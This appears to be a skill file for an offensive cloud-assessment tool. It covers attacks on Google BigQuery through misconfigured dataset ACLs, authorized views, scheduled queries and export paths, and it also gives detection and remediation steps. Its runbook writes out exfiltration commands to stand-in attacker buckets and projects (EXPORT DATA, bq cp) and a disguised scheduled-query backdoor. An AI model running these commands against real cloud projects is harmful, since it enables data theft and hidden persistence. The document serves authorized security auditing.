---
name: gcp-bigquery-attack-surface
description: BigQuery — public datasets, IAM at dataset/table/row level, data-exfil via storage export, scheduled queries pivot
triggers: [bigquery, bq, dataset, table acl, public dataset, scheduled query, authorized view, omni]
---

# GCP BigQuery Attack Surface

BigQuery's security model is multi-layered: project-level IAM, dataset-level ACLs, table-level IAM, row-level security policies, and column-level masking. Bugs cluster in (1) public-shared datasets (when `allAuthenticatedUsers` or `allUsers` ends up in the ACL), (2) data exfil via `bq extract` / `EXPORT DATA`, and (3) scheduled queries running with the creator's identity — a persistent backdoor when the creator's role is high.

Strix's `cloud_attack_paths/patterns.py` includes `_pattern_gcp_public_bigquery_dataset`.

## Attack Surface

### Dataset ACL
- `allUsers` → public to the whole internet (unauthenticated)
- `allAuthenticatedUsers` → any Google account can read
- `domain:other-org.com` → cross-org share
- `userByEmail`, `groupByEmail` → individual / group grants

### Table-level IAM (newer)
- Per-table grants override dataset ACL
- Bug: principal granted dataset-level Viewer + tighter table-level role; principal still reads the dataset via the broader ACL

### Authorized views
- A view in dataset A queries tables in dataset B
- Principal granted access to A's view reads B's data WITHOUT having direct access to B
- Bug: authorized view exposes sensitive columns the principal shouldn't see

### Row-level security (RLS)
- Policy: `creator_id = SESSION_USER()` style predicates
- Bug: RLS not enforced on materialized views, scheduled queries, or BigQuery API direct SQL when the principal has `bigquery.tables.getData` directly

### Scheduled queries
- Run as the creator's identity (or a designated SA)
- Bug: creator with high-priv role leaves; their identity-attached scheduled queries continue running. After offboarding, queries with stale credentials may keep firing
- Workaround pivot: attacker creates a scheduled query that reads sensitive data + writes to attacker-controlled bucket via `EXPORT DATA`

### Data exfil paths
- `bq extract <dataset.table> gs://attacker-bucket/...` — export to Cloud Storage
- `EXPORT DATA OPTIONS(...)` — SQL-level export
- `INSERT INTO <attacker_project.dataset.table> SELECT ... FROM <victim>` — cross-project copy
- `bq cp` — direct table copy across projects

## Detection Channels

### Public-dataset sweep

```bash
PROJECT='target-project'

# List all datasets in the project
bq ls --project_id="$PROJECT" --format=json | jq -r '.[].id'

# Per-dataset ACL
for ds in $(bq ls --project_id="$PROJECT" --format=json | jq -r '.[].id'); do
  echo "=== $ds ==="
  bq show --format=json "${ds}" | jq '.access[]'
done | grep -B1 -E 'allUsers|allAuthenticatedUsers|domain:'
```

### Table-level IAM

```bash
# For a specific table
gcloud projects get-iam-policy "$PROJECT" \
  --filter='bindings.role:roles/bigquery.dataViewer OR bindings.role:roles/bigquery.dataEditor' \
  --format='value(bindings.members)'

# Per-table
bq get-iam-policy "${PROJECT}:dataset.table"
```

### Authorized views audit

```bash
# Views that have cross-dataset access via "authorized view" pattern
for view in $(bq ls --format=json --project_id="$PROJECT" | jq -r '.[] | select(.type == "VIEW") | .id'); do
  bq show --format=json "$view" | jq '{name: .id, view: .view.query, accessControl: .access}'
done
```

### Scheduled queries

```bash
bq ls --transfer_config --transfer_location=us --filter='dataSourceIds:scheduled_query' \
  --format=json | jq '.[] | {name, schedule, query, ownerInfo}'

# Owner with high-priv role + persistent schedule = persistent backdoor pattern
```

## Operational Runbook

### Step 1 — full BQ enumeration

```bash
strix --target gcp://target-project --target-type cloud_account
# Output includes BigQuery dataset + table nodes
```

### Step 2 — public-dataset confirmation

```bash
# For each suspect public dataset, query anonymously
DS='public_dataset_id'
TBL='sensitive_table'

# Without auth — does it work?
curl -s "https://bigquery.googleapis.com/bigquery/v2/projects/${PROJECT}/datasets/${DS}/tables/${TBL}/data?maxResults=10"

# Via gcloud as a different (untrusted) account
gcloud config configurations activate untrusted_account
bq query --project_id="$PROJECT" --use_legacy_sql=false \
  "SELECT * FROM \`${PROJECT}.${DS}.${TBL}\` LIMIT 10"
```

### Step 3 — column / row enumeration

```bash
# Schema disclosure
bq show --schema --format=prettyjson "${PROJECT}:${DS}.${TBL}"

# Look for sensitive columns: email, ssn, phone, dob, address, credit_card, api_key
bq show --schema --format=prettyjson "${PROJECT}:${DS}.${TBL}" | \
  jq '.[] | select(.name | test("email|ssn|phone|dob|address|card|key|secret|token"; "i"))'
```

### Step 4 — exfil via EXPORT DATA

```bash
# When you can write to a target bucket, exfil data
bq query --use_legacy_sql=false \
  "EXPORT DATA OPTIONS(uri='gs://attacker-bucket/exfil-*.csv', format='CSV', overwrite=true) AS SELECT * FROM ${PROJECT}.${DS}.${TBL}"

# Or cross-project copy
bq cp "${VICTIM_PROJECT}:${VICTIM_DS}.${VICTIM_TBL}" "${ATTACKER_PROJECT}:exfil.${VICTIM_TBL}"
```

### Step 5 — scheduled query backdoor

```bash
# Attacker creates a scheduled query that runs daily with their identity
bq mk --transfer_config --target_dataset=attacker_dataset \
  --display_name='innocuous-name' --params='{"query": "SELECT * FROM victim_project.dataset.table"}' \
  --data_source=scheduled_query --schedule='every 24 hours'

# Persistent backdoor: even if attacker's interactive access is revoked,
# the scheduled query keeps running unless explicitly killed.
```

### Step 6 — authorized view pivot

```bash
# Find views that read from sensitive datasets
for view in $(bq ls --format=json --project_id="$PROJECT" | jq -r '.[] | select(.type == "VIEW") | .id'); do
  query=$(bq show --format=json "$view" | jq -r '.view.query')
  if echo "$query" | grep -iE 'pii|secret|credential|sensitive'; then
    echo "SUSPECT VIEW: $view"
    echo "$query"
    bq get-iam-policy "$view"
  fi
done
```

## Specific Vulnerability Classes

### `INFORMATION_SCHEMA` introspection
- Reading `INFORMATION_SCHEMA.TABLES`, `COLUMNS`, etc. requires `bigquery.metadata` permission
- Bug: principal with project-Reader but a tightly-scoped dataset still leaks dataset+table+schema via metadata

### `BIGQUERY_API` ↔ `STORAGE_API` divergence
- BQ Storage Read API has separate IAM (`bigquery.readsessions.create` etc.)
- Bug: principal denied SQL access but granted Storage Read API access → exfil via gRPC Read sessions

### Query history leaks
- `INFORMATION_SCHEMA.JOBS_BY_PROJECT` shows recent queries (default 6-month retention)
- Bug: queries containing literal credentials / PII in WHERE clauses are readable to all project Viewers

### Cross-region replicated datasets
- Dataset replicated to another region for redundancy
- Replica's IAM is independent; drift between primary + replica

## Validation

1. Public-read: unauthenticated query / API call returns data.
2. Cross-account read: a fresh, unrelated GCP account can query the dataset.
3. Schema disclosure: sensitive column names confirmed.
4. Exfil chain: confirm `EXPORT DATA` / `bq extract` succeeds to attacker storage.
5. Scheduled-query backdoor: schedule visible + owner identity confirmed.
6. Document: dataset/table, ACL clause, sensitive columns, exfil path, query log evidence.

## False Positives

- Public datasets that are *deliberately* public (Google Public Datasets program, BigQuery sample data).
- `allAuthenticatedUsers` on a dataset that contains genuinely public reference data (vocabulary lists, public metrics).
- `audit_log` datasets accessible to broad reader groups — often intentional for SOC visibility.
- Authorized views that intentionally expose a sanitised subset — verify with operator.

## Impact

- Direct PII / financial / health data exfil.
- Persistent backdoor via scheduled queries surviving offboarding.
- Cross-project / cross-org data sharing without governance review.
- BigQuery → Cloud Storage pivot via `EXPORT DATA` for downstream exfil.

## Remediation

1. **Org policy: `bigquery.disablePublicDatasets`** — block `allUsers` / `allAuthenticatedUsers` outright.
2. **Dataset-level ACLs reviewed quarterly**: tooling + manual sign-off.
3. **Scheduled queries with dedicated SA**: never user-owned. Offboarding rotates the SA, not the schedule.
4. **VPC-SC perimeter around BigQuery**: data can't leave the perimeter via API calls.
5. **Audit log alerts** on `bigquery.tables.getData` + `bigquery.jobs.create` for sensitive datasets.
6. **Row-level + column-level security** on tables with mixed-sensitivity data.
7. **`INFORMATION_SCHEMA.JOBS` retention policy** + redaction of query literals.

## Pro Tips

1. Public BigQuery datasets are SEARCHABLE on the Google Cloud Marketplace — sometimes the search itself surfaces "everyone has been sharing this".
2. `bq query --dry_run` shows the bytes-scanned without running — useful for fingerprinting the data volume before committing to exfil.
3. Scheduled queries appear in `Data Transfer` UI, not the main BQ UI — defenders often forget to audit them.
4. The default BQ Storage API endpoint (`bigquerystorage.googleapis.com`) has different VPC-SC behavior than the SQL API — audit both.
5. `EXPORT DATA` doesn't need `bq.cli` — it's a SQL statement; any principal with table read + GCS write can exfil.

## Summary

BigQuery exposure: dataset ACL, table IAM, scheduled queries, exfil paths. Audit `allUsers`/`allAuthenticatedUsers` in dataset ACLs first; verify scheduled queries have dedicated SAs; restrict EXPORT DATA via VPC-SC.
